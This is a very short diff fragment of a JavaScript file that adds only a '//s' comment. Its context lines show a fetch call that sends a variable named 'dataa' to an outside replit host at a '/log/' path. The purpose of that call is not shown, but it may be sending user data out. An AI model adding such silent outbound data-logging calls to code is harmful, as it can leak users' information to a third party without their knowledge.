@@ -72,5 +72,5 @@ await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
     "Content-type": "application/json; charset=UTF-8"
     },
 })
-
+//s
 getAnswer();
